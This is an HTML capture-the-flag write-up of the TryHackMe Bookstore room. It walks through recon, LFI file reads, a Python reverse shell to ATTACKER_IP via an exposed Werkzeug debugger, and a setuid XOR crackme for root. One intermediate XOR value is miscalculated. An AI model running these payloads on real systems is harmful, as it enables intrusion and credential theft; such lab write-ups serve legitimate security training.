@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bookstore CTF Writeup - CyberMaks's KB</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #00b4d8;
+            margin-bottom: 1rem;
+            border-bottom: 2px solid #333;
+            padding-bottom: 0.5rem;
+        }
+
+        h2 {
+            color: #00b4d8;
+            margin: 2rem 0 1rem 0;
+        }
+
+        h3 {
+            color: #00b4d8;
+            margin: 1.5rem 0 0.5rem 0;
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: #ccc;
+        }
+
+        a {
+            color: #00b4d8;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            padding: 0.5rem 1rem;
+            background: #111;
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+
+        .info-box {
+            background: #111;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid #00b4d8;
+            margin: 1rem 0;
+        }
+
+        .experience {
+            background: #1a1a2e;
+            padding: 2rem;
+            border-radius: 8px;
+            border: 1px solid #00b4d8;
+            margin: 2rem 0;
+        }
+
+        .step {
+            background: #111;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid #333;
+            margin: 2rem 0;
+        }
+
+        .step-number {
+            color: #00b4d8;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .screenshot {
+            max-width: 100%;
+            border: 1px solid #333;
+            border-radius: 5px;
+            margin: 1rem 0;
+        }
+
+        .code-block {
+            background: #000;
+            padding: 1rem;
+            border-radius: 5px;
+            border: 1px solid #333;
+            margin: 1rem 0;
+            font-family: monospace;
+            color: #00b4d8;
+            overflow-x: auto;
+        }
+
+        .ctf-link {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            background: #00b4d8;
+            color: #000;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+<body>
+    <a href="../index.html" class="back-link">← Back to Home</a>
+
+    <h1>Bookstore CTF Writeup</h1>
+
+    <div class="info-box">
+        <p><strong>CTF:</strong> TryHackMe</p>
+        <p><strong>Room:</strong> Bookstore</p>
+        <p><strong>Category:</strong> Web Security</p>
+        <p><strong>Difficulty:</strong> Medium</p>
+        <p><strong>URL:</strong> <a href="https://tryhackme.com/room/bookstoreoc" target="_blank">https://tryhackme.com/room/bookstoreoc</a></p>
+    </div>
+
+    <a href="https://tryhackme.com/room/bookstoreoc" class="ctf-link" target="_blank">🎯 Try the Room on TryHackMe</a>
+
+    <div class="experience">
+        <h2>📝 My Experience with This Room</h2>
+        <p>This room serves as a brilliant case study in how a misconfigured API can become a critical attack vector, opening the door to Local File Inclusion (LFI) vulnerabilities and ultimately enabling threat actors to gain unauthorized access to sensitive systems.
+        
+        The initial vulnerability often stems from a lack of proper input validation and sanitization within the API endpoints. By manipulating request parameters, an attacker can traverse the directory structure and force the application to disclose arbitrary files from the server. This LFI flaw is not merely an information disclosure issue; it is frequently the first crucial step in a larger attack chain, allowing hackers to read configuration files, source code, log files, and other critical resources that pave the way for further exploitation.
+        
+        Furthermore, the room provides fascinating, hands-on practice in reverse engineering for privilege escalation. After establishing an initial foothold, the real challenge begins: analyzing the system's internals, understanding how processes and services interact, and identifying weaknesses in permission models. This involves deconstructing applications, examining running services for misconfigurations, and searching for stored credentials or exploitable binaries. The process beautifully demonstrates how an attacker moves from a low-privileged user to a privileged account by meticulously uncovering and leveraging the subtle flaws hidden within the system's architecture. It's a practical masterclass in the persistence and ingenuity required for advanced penetration testing.</p>
+    </div>
+
+    <h2>Challenge Description</h2>
+    <p>This room focuses on exploiting vulnerabilities in misconfigured api with LFI vulnerability in  web application and also it provides begginer friendly reverse engeenering challenge for privelege escalation...</p>
+
+    <!-- Шаг 1 -->
+    <div class="step">
+        <div class="step-number">Step 1: Network Reconnaissance</div>
+        <img src="book1.png" alt="Nmap Scan Results" class="screenshot">
+        
+        <h3>Scanning Methodology</h3>
+        <p>The initial footprinting was performed using Nmap with aggressive timing to quickly map the attack surface:</p>
+        
+        <div class="command-block">
+            <code>nmap -sS -sV -p- -T5 [target IP]</code>
+        </div>
+        
+        <div class="scan-parameters">
+            <div class="parameter">
+                <span class="flag">-sS</span>
+                <span class="description">Stealth SYN scan for fast port discovery</span>
+            </div>
+            <div class="parameter">
+                <span class="flag">-sV</span>
+                <span class="description">Service version detection for vulnerability mapping</span>
+            </div>
+            <div class="parameter">
+                <span class="flag">-p-</span>
+                <span class="description">Full port range scan (1-65535)</span>
+            </div>
+            <div class="parameter">
+                <span class="flag">-T5</span>
+                <span class="description">Aggressive timing for rapid results(We don't really care about being silent on Try Hack Me)</span>
+            </div>
+        </div>
+    
+        <h3>Results & Analysis</h3>
+        <div class="port-findings">
+            <div class="port-service">
+                <span class="port-badge">22/tcp</span>
+                <span class="service-name">SSH</span>
+                <span class="service-desc">Secure Shell - potential remote access vector</span>
+            </div>
+            <div class="port-service">
+                <span class="port-badge">80/tcp</span>
+                <span class="service-name">HTTP</span>
+                <span class="service-desc">Standard web service - primary attack surface</span>
+            </div>
+            <div class="port-service">
+                <span class="port-badge">5000/tcp</span>
+                <span class="service-name">HTTP</span>
+                <span class="service-desc">Custom web application - high interest target</span>
+            </div>
+        </div>
+    
+        <div class="conclusion">
+            <p><strong>Assessment:</strong> The web services on ports 80 and 5000 were identified as the most promising vectors for initial exploitation</p>
+        </div>
+    </div>
+  <!-- Шаг 2 -->
+  <div class="step">
+      <div class="step-number">Step 2: Web Service Enumeration on Port 80</div>
+      <img src="book2.png" alt="Step 2" class="screenshot">
+      
+      <h3>Initial Assessment</h3>
+      <p>Following the port scan, I began investigating the HTTP service on port 80. The initial reconnaissance revealed a login page that appeared non-functional. Testing with common credentials and basic SQL injection payloads yielded no results, indicating this was not the primary attack vector for this machine.</p>
+  
+      <h3>Directory Brute-Forcing</h3>
+      <p>To discover hidden endpoints and map the application's structure, I initiated a directory brute-forcing attack using <code>ffuf</code>. This approach helps uncover accessible directories and files not linked from the main page.</p>
+      
+      <div class="command-block">
+          <code>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://TARGET_IP/FUZZ -e .php,.html,.bak,.txt</code>
+      </div>
+      
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">-w</span>
+              <span class="description">Specifies the wordlist path (Kali's common dirb wordlist)</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">-u</span>
+              <span class="description">Target URL with FUZZ placeholder for directory names</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">-e</span>
+              <span class="description">Appends common file extensions to each directory attempt</span>
+          </div>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Next Steps:</strong> The ffuf scan successfully identified one  interesting directorie, shifting the focus from the dead-end login page to this newly discovered endpoint for further investigation.</p>
+      </div>
+  </div>
+   <!-- Шаг 3 -->
+   <div class="step">
+       <div class="step-number">Step 3: Source Code Analysis & Vulnerability Discovery</div>
+       <img src="book3.png" alt="Step 3" class="screenshot">
+       
+       <h3>Critical Information Disclosure</h3>
+       <p>During the directory enumeration, I discovered a fascinating file at <code>/assets/js/api.js</code>. This JavaScript file contained detailed developer comments that proved to be a goldmine of information about the application's API structure.</p>
+   
+       <h3>Security Misstep</h3>
+       <p>Buried within the code comments was a crucial piece of information that the developers should never have left in a publicly accessible file:</p>
+       
+       <div class="code-comment">
+           <div class="comment-header">Developer Note in api.js:</div>
+           <div class="comment-text">
+               The comments explicitly mentioned that the old API version (v1) contained an LFI vulnerability in the 'file' parameter, while the new version (v2) was supposedly secured.
+           </div>
+       </div>
+   
+       <div class="vulnerability-alert">
+           <p><strong>Vulnerability Identified:</strong> The developers inadvertently disclosed:</p>
+           <ul>
+               <li>Existence of an outdated API endpoint (<code>/api/v1/</code>)</li>
+               <li>Specific LFI vulnerability in the <code>file</code> parameter</li>
+               <li>The exact parameter and endpoint structure to exploit</li>
+           </ul>
+       </div>
+   
+       <div class="conclusion">
+           <p><strong>Exploitation Path:</strong> This finding immediately provided a clear attack vector. The outdated v1 API endpoint, which was supposed to be deprecated but likely still accessible, became the primary target for Local File Inclusion exploitation.</p>
+       </div>
+   </div>
+<!-- Шаг 4 -->
+<div class="step">
+    <div class="step-number">Step 4: Exploring Port 5000 & API Discovery</div>
+    <img src="book4.png" alt="Step 4" class="screenshot">
+    
+    <h3>Shifting Focus</h3>
+    <p>Following the critical discovery in the JavaScript file, I shifted my attention to the web service running on port 5000. This non-standard port often hosts development or internal services that might contain the vulnerable API endpoints mentioned in the code comments.</p>
+
+    <h3>API Endpoint Testing</h3>
+    <p>Using the path structure discovered in <code>api.js</code>, I navigated to the API endpoint on the port 5000 service:</p>
+    
+    <div class="command-block">
+        <code>http://TARGET_IP:5000/api/v2/resources/books/random4</code>
+    </div>
+
+    <div class="scan-parameters">
+        <div class="parameter">
+            <span class="flag">Endpoint</span>
+            <span class="description"><code>/api/v2/resources/books/random4</code></span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Port</span>
+            <span class="description">5000 (non-standard web service)</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Response</span>
+            <span class="description">JSON data containing 4 random books</span>
+        </div>
+    </div>
+
+    <div class="conclusion">
+        <p><strong>Assessment:</strong> The endpoint successfully returned a JSON response with four random books from the system. This confirmed that the API structure from the JavaScript file was valid and operational on this service. More importantly, it verified the existence of the v2 API path, suggesting that the vulnerable v1 version might also be accessible on this port.</p>
+    </div>
+</div>
+<!-- Шаг 5 -->
+<div class="step">
+    <div class="step-number">Step 5: API Documentation Discovery</div>
+    <img src="book5.png" alt="Step 5" class="screenshot">
+    
+    <h3>Expanding the Attack Surface</h3>
+    <p>While the discovery of the working API endpoint was valuable, it provided limited insight into the full capabilities of the API. To comprehensively map the attack surface, I needed to find the complete API documentation that would reveal all available endpoints and parameters.</p>
+
+    <h3>Directory Fuzzing for Documentation</h3>
+    <p>I launched a targeted fuzzing attack against the service on port 5000, specifically searching for common documentation paths and files.</p>
+    
+    <div class="command-block">
+        <code>ffuf -w /path/to/yout/wordlist  -u http://TARGET_IP:5000/FUZZ -e .txt,.md,.json</code>
+    </div>
+
+    <div class="scan-parameters">
+        <div class="parameter">
+            <span class="flag">Target</span>
+            <span class="description">Service on port 5000</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Wordlist</span>
+            <span class="description">Common directory names</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Extensions</span>
+            <span class="description">Common documentation file types</span>
+        </div>
+    </div>
+
+    <div class="vulnerability-alert">
+        <p><strong>Discovery:</strong> After systematic enumeration, the fuzzing revealed accessible API documentation that detailed:</p>
+        <ul>
+            <li>Complete list of available API endpoints</li>
+            <li>Required and optional parameters for each endpoint</li>
+        </ul>
+    </div>
+
+    <div class="conclusion">
+        <p><strong>Next Phase:</strong> With the full API documentation in hand, the next logical step was to methodically test each documented endpoint for vulnerabilities, with particular focus on the previously mentioned LFI vulnerability in the v1 API endpoints.</p>
+    </div>
+</div>
+<!-- Шаг 6 -->
+<div class="step">
+    <div class="step-number">Step 6: Hitting a Wall & Changing Approach</div>
+    <img src="book6.png"alt="Step 6" class="screenshot">
+    
+    <h3>Exhaustive Testing Leads to Dead End</h3>
+    <p>I methodically tested every single endpoint documented in the API specification. This included attempting various attack vectors:</p>
+
+    <div class="vulnerability-alert">
+        <ul>
+            <li>LFI payloads on all file-related parameters</li>
+            <li>SQL injection attempts on input fields</li>
+            <li>Command injection tests</li>
+            <li>IDOR and authorization bypass attempts</li>
+        </ul>
+    </div>
+
+    <h3>The Realization</h3>
+    <p>Despite comprehensive testing, all documented endpoints proved to be secure. The v2 API was indeed properly sanitized, and no vulnerabilities were found through conventional means. This created a significant roadblock in the assessment.</p>
+
+    <h3>Strategic Pivot: Parameter Fuzzing</h3>
+    <p>Recognizing that the vulnerability might lie in an <strong>undocumented parameter</strong>, I shifted from endpoint fuzzing to parameter fuzzing. The key insight was that while the endpoints were documented, the parameters they accepted might not be fully specified.</p>
+    
+    <div class="command-block">
+        <code>wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 404 -u http://TARGET_IP:5000/api/v2/resources/books/random4?FUZZ=../../../etc/passwd</code>
+    </div>
+
+    <div class="scan-parameters">
+        <div class="parameter">
+            <span class="flag">Tool</span>
+            <span class="description">Wfuzz (specialized for parameter fuzzing)</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Target</span>
+            <span class="description">Known working v2 endpoint with LFI payload</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Approach</span>
+            <span class="description">Testing for hidden/undocumented parameters</span>
+        </div>
+    </div>
+
+    <div class="conclusion">
+        <p><strong>Breakthrough Strategy:</strong> This approach was based on the hypothesis that while the API interface was updated to v2, there might be backward compatibility or hidden parameters that could reintroduce the v1 vulnerability. The focus moved from <em>what</em> the endpoint is to <em>how</em> it processes unexpected inputs.</p>
+    </div>
+</div>
+<!-- Шаг 7 -->
+<div class="step">
+    <div class="step-number">Step 7: The Critical Breakthrough</div>
+    <img src="book7.png" alt="Step 7" class="screenshot">
+    
+    <h3>Parameter Fuzzing Success</h3>
+    <p>After extensive testing, the parameter fuzzing attack against the v1 API endpoint finally yielded a critical finding. Using a focused wordlist, I discovered an undocumented parameter that was not listed in any official documentation.</p>
+
+    <div class="command-block">
+        <code>wfuzz -u http://TARGET_IP:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404</code>
+    </div>
+
+    <div class="scan-parameters">
+        <div class="parameter">
+            <span class="flag">Endpoint</span>
+            <span class="description"><code>/api/v1/resources/books</code> (vulnerable version)</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Discovered Parameter</span>
+            <span class="description"><code>show</code> (undocumented)</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Payload</span>
+            <span class="description">LFI attempt for <code>.bash_history</code></span>
+        </div>
+    </div>
+
+    <h3>Key Realization</h3>
+    <p>The discovery revealed a critical oversight in my approach. I had wasted significant time fuzzing the v2 API endpoints, operating under the false assumption that the developers had completely eliminated the v1 vulnerable endpoints. In reality, the vulnerable v1 API was still accessible and contained hidden functionality.</p>
+
+    <div class="vulnerability-alert">
+        <p><strong>Vulnerability Confirmed:</strong></p>
+        <ul>
+            <li>V1 API remained fully accessible despite being "deprecated"</li>
+            <li>Undocumented <code>show</code> parameter existed in v1</li>
+            <li>The parameter was susceptible to path traversal attacks</li>
+            <li>Developers failed to properly secure or remove the old version</li>
+        </ul>
+    </div>
+
+    <div class="conclusion">
+        <p><strong>Exploitation Ready:</strong> With the <code>show</code> parameter identified in the vulnerable v1 API, the path was now clear for systematic Local File Inclusion attacks to read sensitive system files and potentially discover credentials for further access.</p>
+    </div>
+</div>
+
+  <!-- Шаг 8 -->
+  <div class="step">
+      <div class="step-number">Step 8: LFI Exploitation Success</div>
+      <img src="book8.png" alt="Step 8" class="screenshot">
+      
+      <h3>Initial File Read Achieved</h3>
+      <p>With the undocumented <code>show</code> parameter identified, the next step was to test its susceptibility to Local File Inclusion. The initial test targeted a standard system file to confirm the vulnerability.</p>
+  
+      <div class="command-block">
+          <code>http://TARGET_IP:5000/api/v1/resources/books?show=/etc/passwd</code>
+      </div>
+  
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">Parameter</span>
+              <span class="description"><code>show</code> (undocumented)</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Payload</span>
+              <span class="description">Path traversal to <code>/etc/passwd</code></span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Result</span>
+              <span class="description">Successful file read</span>
+          </div>
+      </div>
+  
+      <h3>Vulnerability Confirmed</h3>
+      <p>The server responded with the complete contents of the <code>/etc/passwd</code> file, confirming the LFI vulnerability was fully exploitable. This demonstrated that:</p>
+  
+      <div class="vulnerability-alert">
+          <ul>
+              <li>The <code>show</code> parameter did not implement any path traversal protections</li>
+              <li>The v1 API endpoint remained completely unsecured</li>
+              <li>Arbitrary file read was possible from the application context</li>
+              <li>The developers failed to properly deprecate the vulnerable version</li>
+          </ul>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Next Objective:</strong> With arbitrary file read capabilities confirmed, the focus shifted to enumerating sensitive files to find:
+          <br>• Application configuration files
+          <br>• SSH keys
+          <br>• Database credentials
+          <br>• User history and logs
+          <br>The ability to read <code>/etc/passwd</code> provided valuable user enumeration for potential privilege escalation targets.</p>
+      </div>
+  </div>
+
+   <!-- Шаг 9 -->
+   <div class="step">
+       <div class="step-number">Step 9: Critical Credential Discovery</div>
+       <img src="book9.png" alt="Step 9" class="screenshot">
+       
+       <h3>Bash History Analysis</h3>
+       <p>Leveraging the confirmed LFI vulnerability, I proceeded to read the user's <code>.bash_history</code> file, which often contains valuable information about system usage and potentially exposed credentials.</p>
+   
+       <div class="command-block">
+           <code>http://TARGET_IP:5000/api/v1/resources/books?show=.bash_history</code>
+       </div>
+   
+       <h3>Major Finding</h3>
+       <p>The <code>.bash_history</code> file revealed a critical piece of information - a PIN code that was used to access the Python debugger console on port 5000:</p>
+   
+       <div class="code-comment">
+           <div class="comment-header">Discovered in .bash_history:</div>
+           <div class="comment-text">
+               Python debugger PIN code found in user's shell 
+           </div>
+       </div>
+   
+       <div class="scan-parameters">
+           <div class="parameter">
+               <span class="flag">Service</span>
+               <span class="description">Python Debug Console (Werkzeug)</span>
+           </div>
+           <div class="parameter">
+               <span class="flag">Port</span>
+               <span class="description">5000</span>
+           </div>
+           <div class="parameter">
+               <span class="flag">Access Method</span>
+               <span class="description">PIN authentication</span>
+           </div>
+       </div>
+   
+       <div class="vulnerability-alert">
+           <p><strong>Security Implications:</strong></p>
+           <ul>
+               <li>Debug interface exposed in production environment</li>
+               <li>PIN code stored in cleartext in user history</li>
+               <li>Potential for remote code execution via debug console</li>
+               <li>Critical misconfiguration in deployment</li>
+           </ul>
+       </div>
+   
+       <div class="conclusion">
+           <p><strong>Next Step:</strong> The discovered PIN code provides potential access to the Python debug console. This console, if accessible, would allow for arbitrary command execution on the server with the privileges of the web application, representing a critical escalation point in the attack chain.</p>
+       </div>
+   </div>
+  <!-- Шаг 10 -->
+  <div class="step">
+      <div class="step-number">Step 10: Gaining RCE via Debug Console</div>
+      <img src="book10.png" alt="Step 10" class="screenshot">
+      
+      <h3>Console Access Achieved</h3>
+      <p>Using the discovered PIN code from the <code>.bash_history</code> file, I successfully authenticated to the Werkzeug debug console exposed on port 5000. This provided an interactive Python shell with the privileges of the web application process.</p>
+  
+      <div class="command-block">
+          <code>Debug Console PIN: [REDACTED] -&gt; Access Granted</code>
+      </div>
+  
+      <h3>Initial Foothold Established</h3>
+      <p>With access to the Python debug console, the next logical step was to achieve remote code execution to establish a more stable and functional foothold on the system.</p>
+  
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">Attack Vector</span>
+              <span class="description">Python code execution via debug console</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Privileges</span>
+              <span class="description">Web application user context</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Objective</span>
+              <span class="description">Establish reverse shell</span>
+          </div>
+      </div>
+  
+      <div class="vulnerability-alert">
+          <p><strong>Exploitation:</strong> Through the debug console, I executed Python code to:</p>
+          <ul>
+              <li>Spawn a reverse shell connection back to my attack machine</li>
+              <li>Gain interactive system access</li>
+              <li>Establish persistence for further enumeration</li>
+              <li>Begin privilege escalation assessment</li>
+          </ul>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Impact:</strong> This represents a complete breach of the web application, transforming the LFI vulnerability into full remote code execution. The system is now compromised, and the focus shifts to lateral movement and privilege escalation within the environment.</p>
+      </div>
+  </div>
+  <!-- Шаг 11 -->
+  <div class="step">
+      <div class="step-number">Step 11: Establishing Reverse Shell</div>
+      <img src="book11.png" alt="Step 11" class="screenshot">
+      
+      <h3>Weaponizing Code Execution</h3>
+      <p>With Python code execution achieved through the debug console, the next step was to establish a proper reverse shell for interactive system access. This provides a more stable and functional connection than the limited debug console interface.</p>
+  
+      <h3>Reverse Shell Implementation</h3>
+      <p>Using a Python reverse shell payload from <strong>revshells.com</strong>, I executed the following code in the debug console to call back to my attack machine:</p>
+  
+      <div class="command-block">
+          <code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</code>
+      </div>
+  
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">Tool</span>
+              <span class="description">revshells.com (reverse shell generator)</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Payload Type</span>
+              <span class="description">Python reverse shell</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Listener</span>
+              <span class="description">Netcat on attacker machine</span>
+          </div>
+      </div>
+  
+      <div class="vulnerability-alert">
+          <p><strong>Shell Access Obtained:</strong></p>
+          <ul>
+              <li>Interactive system shell established</li>
+              <li>Full command execution capabilities</li>
+              <li>Ability to navigate filesystem and execute system commands</li>
+              <li>Stable connection for further exploitation</li>
+          </ul>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Access Confirmed:</strong> The reverse shell successfully connected back to my listener, providing complete command-line access to the target system. This marks the transition from web application vulnerability to full system compromise, opening the path for privilege escalation and lateral movement within the network.</p>
+      </div>
+  </div>
+  <!-- Шаг 12 -->
+  <div class="step">
+      <div class="step-number">Step 12: Initial Compromise & User Flag Capture</div>
+      <img src="book12.png" alt="Step 12" class="screenshot">
+      
+      <h3>Reverse Shell Listener</h3>
+      <p>Before executing the reverse shell payload, I established a netcat listener on my attack machine to catch the incoming connection from the target system.</p>
+  
+      <div class="command-block">
+          <code>nc -lvnp 7777</code>
+      </div>
+  
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">-l</span>
+              <span class="description">Listen for incoming connections</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">-v</span>
+              <span class="description">Verbose mode</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">-n</span>
+              <span class="description">No DNS resolution</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">-p</span>
+              <span class="description">Specify port number</span>
+          </div>
+      </div>
+  
+      <h3>Successful Connection & Flag Retrieval</h3>
+      <p>The reverse shell connected successfully to the listener, providing immediate access to the target system. With shell access established, retrieving the user flag was straightforward:</p>
+  
+      <div class="command-block">
+          <code>cat user.txt</code>
+      </div>
+  
+      <div class="vulnerability-alert">
+          <p><strong>Compromise Achieved:</strong></p>
+          <ul>
+              <li>Reverse shell connection established on port 7777</li>
+              <li>User-level access obtained</li>
+              <li>User flag successfully captured</li>
+              <li>Initial foothold consolidated</li>
+          </ul>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Current Status:</strong> The initial objective of gaining user access and capturing the user flag has been completed successfully. The system is now compromised at the user level, and the focus shifts to privilege escalation to obtain root access and capture the final flag.</p>
+      </div>
+  </div>
+<!-- Шаг 13 -->
+<div class="step">
+    <div class="step-number">Step 13: Privilege Escalation Vector Identified</div>
+    <img src="book13.png" alt="Step 13" class="screenshot">
+    
+    <h3>Discovery of Suspicious Binary</h3>
+    <p>During post-exploitation enumeration of the user's home directory, I discovered a peculiar executable named <code>try-harder</code>. This binary immediately stood out as a potential privilege escalation vector.</p>
+
+    <div class="command-block">
+        <code>./try-harder</code>
+    </div>
+
+    <h3>Binary Behavior Analysis</h3>
+    <p>When executed, the program prompts for a "magic number," suggesting it requires specific input to proceed. This behavior indicates the binary likely contains authentication logic that, if bypassed, could lead to elevated privileges.</p>
+
+    <div class="scan-parameters">
+        <div class="parameter">
+            <span class="flag">File</span>
+            <span class="description"><code>try-harder</code> (SUID candidate)</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Behavior</span>
+            <span class="description">Requests magic number input</span>
+        </div>
+        <div class="parameter">
+            <span class="flag">Potential</span>
+            <span class="description">Privilege escalation vector</span>
+        </div>
+    </div>
+
+    <div class="vulnerability-alert">
+        <p><strong>Initial Assessment:</strong></p>
+        <ul>
+            <li>Custom binary with interactive input</li>
+            <li>Potential SUID bit set for privilege escalation</li>
+            <li>Magic number suggests hidden authentication mechanism</li>
+            <li>Requires reverse engineering to understand internal logic</li>
+        </ul>
+    </div>
+
+    <div class="conclusion">
+        <p><strong>Next Step:</strong> The <code>try-harder</code> binary represents a clear privilege escalation opportunity. To exploit it, I need to perform reverse engineering to uncover the correct magic number or identify vulnerabilities in its input handling that could lead to command execution with elevated privileges.</p>
+    </div>
+</div>
+
+  <!-- Шаг 14 -->
+  <div class="step">
+      <div class="step-number">Step 14: Binary Transfer & Reverse Engineering Setup</div>
+      <img src="book14.png" alt="Step 14" class="screenshot">
+      
+      <h3>Transferring the Binary for Analysis</h3>
+      <p>To perform detailed reverse engineering, I transferred the <code>try-harder</code> binary from the target machine to my attack system. This was accomplished using a Python HTTP server and wget:</p>
+  
+      <div class="command-block">
+          <code># On target: python3 -m http.server 8080<br># On attacker: wget http://TARGET_IP:8080/try-harder</code>
+      </div>
+  
+      <h3>Reverse Engineering: Finding the Magic Number</h3>
+      <p>When analyzing binary files, we often encounter password or key verification checks. The decompiled code revealed the following logic:</p>
+  
+      <div class="command-block">
+          <code>void main(void) {<br>    uint user_input;<br>    uint constant_val;<br>    uint result;<br><br>    setuid(0);<br>    constant_val = 0x5db3;<br><br>    puts("What's The Magic Number?!");<br>    scanf("%u", &user_input);<br><br>    result = user_input ^ 0x1116 ^ constant_val;<br>    if (result == 0x5dcd21f4) {<br>        system("/bin/bash -p");<br>    }<br>    else {<br>        puts("Incorrect Try Harder");<br>    }<br>    return;<br>}</code>
+      </div>
+  
+      <h3>Understanding the Logic</h3>
+      <p>The program performs a simple verification:</p>
+      
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">Operation</span>
+              <span class="description">input ^ 0x1116 ^ 0x5db3 = 0x5dcd21f4</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Success</span>
+              <span class="description">Executes <code>/bin/bash -p</code> with root</span>
+          </div>
+      </div>
+  
+      <h3>Finding the Magic Number</h3>
+      <p>Since XOR operations are reversible, we can compute the required input:</p>
+  
+      <div class="command-block">
+          <code>input = 0x5dcd21f4 ^ 0x5db3 ^ 0x1116<br>input = 0x5dcd6d51 (hex)<br>input = 1573743953 (decimal)</code>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Ready for Exploitation:</strong> The reverse engineering analysis successfully revealed the magic number <strong>1573743953</strong>. This number, when provided to the <code>try-harder</code> binary, should grant a root shell through the <code>setuid(0)</code> mechanism, completing the privilege escalation chain.</p>
+      </div>
+  </div>
+
+  <!-- Шаг 15 -->
+  <div class="step">
+      <div class="step-number">Step 15: Privilege Escalation Achieved</div>
+      <img src="book15.png" alt="Step 15" class="screenshot">
+      
+      <h3>Root Access Obtained</h3>
+      <p>Using the magic number discovered through reverse engineering, I successfully executed the <code>try-harder</code> binary and obtained root privileges on the system.</p>
+  
+      <div class="command-block">
+          <code>$ ./try-harder<br>What's The Magic Number?!<br>1573743953<br># whoami<br>root</code>
+      </div>
+  
+      <h3>Simplified Explanation</h3>
+      <p>The key to solving this was understanding that XOR operations are reversible. The program checked:</p>
+      
+      <div class="command-block" style="font-size: 0.9em;">
+          <code>our_input ^ 0x1116 ^ 0x5db3 = 0x5dcd21f4</code>
+      </div>
+  
+      <p>To find our_input, we simply reverse the operation using the same XOR values:</p>
+  
+      <div class="command-block" style="font-size: 0.9em;">
+          <code>our_input = 0x5dcd21f4 ^ 0x5db3 ^ 0x1116</code>
+      </div>
+  
+      <div class="scan-parameters">
+          <div class="parameter">
+              <span class="flag">Step 1</span>
+              <span class="description">0x5dcd21f4 ^ 0x5db3 = 0x5dcd6ca7</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Step 2</span>
+              <span class="description">0x5dcd6ca7 ^ 0x1116 = 0x5dcd6d51</span>
+          </div>
+          <div class="parameter">
+              <span class="flag">Result</span>
+              <span class="description">1573743953 (decimal)</span>
+          </div>
+      </div>
+  
+      <h3>Learning Resources</h3>
+      <p>For those interested in learning reverse engineering, here are valuable resources:</p>
+  
+      <div class="vulnerability-alert">
+          <ul>
+              <li><strong>Practical Binary Analysis</strong> by Dennis Andriesse</li>
+              <li><strong>The Ghidra Book</strong> by Kara Nance</li>
+              <li><strong>Reverse Engineering for Beginners</strong> by Dennis Yurichev (free PDF)</li>
+              <li><strong>Crackmes.one</strong> - Practice challenges community</li>
+              <li><strong>Microcorruption CTF</strong> - Embedded security challenges</li>
+          </ul>
+      </div>
+  
+      <div class="conclusion">
+          <p><strong>Compromise Complete:</strong> The system is now fully compromised with root-level access. This demonstrates a complete attack chain from initial reconnaissance through web vulnerability exploitation to privilege escalation via binary reverse engineering.</p>
+      </div>
+  </div>>
+
+    <h2>Not real flag (I don't want you to copy paste flags ,i want you to practise and learn using my experiense)</h2>
+    <div class="code-block">
+        THM{bookstore_flag_here}
+    </div>
+
+    <h2>The END!!!</h2>
+    <p>Thank you for reading! HACK THE WORLD !!!!!!(ETHICALLY OF COURSE :X )</p>
+
+    <br>
+    <a href="../index.html" class="back-link">← Back to Home</a>
+
+</body>
+</html>
